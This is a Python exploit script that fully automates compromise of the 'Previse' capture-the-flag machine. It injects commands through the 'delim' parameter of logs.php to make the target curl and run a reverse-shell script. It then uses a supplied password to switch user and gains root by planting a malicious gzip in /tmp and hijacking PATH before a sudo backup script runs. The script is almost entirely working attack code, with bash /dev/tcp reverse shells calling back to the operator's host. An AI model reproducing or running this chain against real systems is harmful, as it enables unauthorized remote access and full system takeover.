#!/usr/bin/python3

import threading, socket, subprocess, sys, signal, os, requests, argparse, time, re

login_url = "http://10.10.11.104/login.php"
logs_url = "http://10.10.11.104/logs.php"
burp = {"http" : "http://127.0.0.1:8080"}

def sendline(victim, command):
	response = ''
	victim.sendall(command.encode())
	time.sleep(1)
	while True:
		response += victim.recv(69549).decode()
		regex = re.findall("(.*?@previse:.+\$ |bash.*?\$ )$", response)
		if regex:
			break
	return response

def netcatListener():
	netcat_proc = subprocess.Popen(["nc", f"-lvnp {port}"])
	return netcat_proc

def socketServ(s):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		sock.bind(("", root_port))
		print(f"[*] Listening on port: {root_port}")
		sock.listen()
		t = threading.Thread(target=execShell, args=(s,))
		t.daemon = True
		t.start()
		victim, addr = sock.accept()
		print(f"[*] New connection from: {addr}")
		time.sleep(2)
		print("[~] Trying to pwn m4lwhere user")
		sendline(victim, "script /dev/null -c bash\n")
		sendline(victim, "whoami\n")
		victim.sendall(b"su m4lwhere\n")
		time.sleep(2)

		sendline(victim, password + "\n")

		response = sendline(victim, "whoami\n")
		whoami = re.findall("whoami\r\n(.*?)\r\n", response)[0]
		if whoami == "m4lwhere":
			print("[$] m4lwhere user pwned")
			victim.sendall(b"sudo -l\n")
			time.sleep(2)
			victim.recv(69495).decode()
			sendline(victim, password + "\n")
			print("[#] Trying to get root")
			sendline(victim, "cd /tmp\n")
			sendline(victim, "rm gzip\n")
			sendline(victim, f"printf '#!/bin/bash\n\nbash -i >& /dev/tcp/{host}/{port} 0>&1\n' >> gzip\n")
			sendline(victim, "chmod +x gzip\n")
			response = sendline(victim, "ls -la\n")

			if "gzip" in response:
				print("[#] Gzip File Created Successfully")
			sendline(victim, "export PATH=/tmp:$PATH\n")
			netcat_proc = netcatListener()
			print("[#] Running the access_backup.sh script")
			sendline(victim, "sudo /opt/scripts/access_backup.sh\n")
			print("[-] Connection Finished.")
			sock.close()
		else:
			print("[!] Something went wrong")
			sock.close()
			sys.exit(1)

def execShell(s):
	print("[*] Executing reverse shell")
	reverse_data = {
		"delim" : "tab;bash shell.sh"
	}
	r = s.post(logs_url, data=reverse_data)

def phpServer():
	print("[*] Starting PHP Server")
	time.sleep(2)
	php_proc = subprocess.Popen(["php", "-S", f"0.0.0.0:{port}"], stderr=subprocess.DEVNULL)
	return php_proc

def login(host, port, password):
	s = requests.Session()
	login_data = {
		"username" : "m4lwhere",
		"password" : password
	}

	r = s.post(login_url, data=login_data)
	if "Invalid Username or Password" in r.text:
		print("[!] Invalid Password!")
		sys.exit(1)
	print("[*] Password accepted")
	time.sleep(1)
	with open("index.html", "w") as f:
		f.write("#!/bin/bash")
		f.write(f"\n\nbash -i >& /dev/tcp/{host}/{root_port} 0>&1")
	print("[*] File: index.html created")
	time.sleep(1)

	php_proc = phpServer()
	print("[*] PHP Server Started.")
	logs_data = {
		"delim" : f"tab;curl http://{host}:{port}/ -o shell.sh"
	}

	try:
		r = s.post(logs_url, data=logs_data, timeout=4)
	except requests.exceptions.Timeout:
		print("[!] Timeout, check your Listener Host")
		os.kill(php_proc.pid, signal.SIGINT)
		sys.exit(1)

	print("[*] Reverse Shell Loaded in victim machine")

	time.sleep(1)
	os.kill(php_proc.pid, signal.SIGINT)
	print("[*] PHP Process Killed")
	time.sleep(2)
	socketServ(s)

def def_handler(sig, frame):
	print("\n\n[*] Exiting\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # CTRL + C

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("--lhost", help="Listener Host", required=True, metavar="<VPN ip>")
	parser.add_argument("--lp", "--lport", help="Listener Port", required=True, metavar="<port>", dest="lport")
	parser.add_argument("--rp", "--rootport", help="Second Port to be root", required=True, metavar="<second port>", dest="rootport", type=int)
	parser.add_argument("--password", help="m4lwhere password", required=True, metavar="<password>")
	args = parser.parse_args()
	host = args.lhost
	port = args.lport
	root_port = args.rootport
	password = args.password
	login(host, port, password)